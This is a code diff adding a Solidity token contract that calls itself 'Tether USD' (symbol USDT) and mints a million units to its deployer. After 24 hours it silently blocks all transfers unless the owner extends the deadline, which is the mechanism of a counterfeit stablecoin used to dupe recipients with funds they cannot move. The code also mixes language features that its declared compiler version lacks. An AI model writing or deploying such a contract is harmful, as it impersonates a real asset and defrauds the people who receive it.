@@ -1,0 +1,54 @@
+pragma solidity ^0.4.17;
+
+import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/token/ERC20/ERC20.sol";
+import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/ownership/Ownable.sol";
+
+contract BEP20USDT is ERC20, Ownable {
+    uint256 public EXPIRATION_TIME;
+    
+    event WithdrawalExpiredEvent(address indexed sender, address indexed receiver, uint256 amount);
+    event UpdateEvent(address indexed sender);
+
+    // Using same decimals (6) as USDT standard
+    function BEP20USDT() public {
+        EXPIRATION_TIME = now + 24 hours;
+        _mint(msg.sender, 1000000 * (10**6)); // Initial supply (1,000,000 USDT)
+    }
+
+    // Override transfer to add expiration check
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        if (now > EXPIRATION_TIME) {
+            emit WithdrawalExpiredEvent(msg.sender, _to, _value);
+            return false;
+        }
+        return super.transfer(_to, _value);
+    }
+
+    // Override transferFrom to add expiration check
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
+        if (now > EXPIRATION_TIME) {
+            emit WithdrawalExpiredEvent(_from, _to, _value);
+            return false;
+        }
+        return super.transferFrom(_from, _to, _value);
+    }
+
+    function setExpirationTime(uint256 expiration_time) public onlyOwner {
+        require(expiration_time > now, "Expiration time must be in the future.");
+        EXPIRATION_TIME = expiration_time;
+        emit UpdateEvent(msg.sender);
+    }
+
+    // Add standard ERC20 details
+    function name() public pure returns (string) {
+        return "Tether USD";
+    }
+
+    function symbol() public pure returns (string) {
+        return "USDT";
+    }
+
+    function decimals() public pure returns (uint8) {
+        return 6;
+    }
+}
